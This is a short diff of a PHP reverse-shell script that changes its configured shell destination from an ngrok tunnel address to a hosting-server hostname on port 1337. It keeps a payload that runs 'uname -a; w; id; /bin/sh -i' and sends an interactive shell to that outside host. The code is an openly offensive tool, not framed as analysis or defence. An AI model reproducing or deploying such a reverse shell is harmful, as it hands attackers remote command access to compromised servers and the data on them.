@@ -4,8 +4,8 @@
 
     // CHANGE THE FOLLOWING PARAMS AS NEEDED:
     //---------------------------------------------------------------
-    $addr = '6.tcp.ngrok.io';   # shell destination (loopback for testing)
-    $port = 13649;          # shell destination port
+    $addr = 'vmi850151.contaboserver.net';   # shell destination (loopback for testing)
+    $port = 1337;          # shell destination port
     $timeout = 20.0;       # connection timeout time (seconds):
     $shell = 'uname -a; w; id; /bin/sh -i'; # shell to run
     //---------------------------------------------------------------
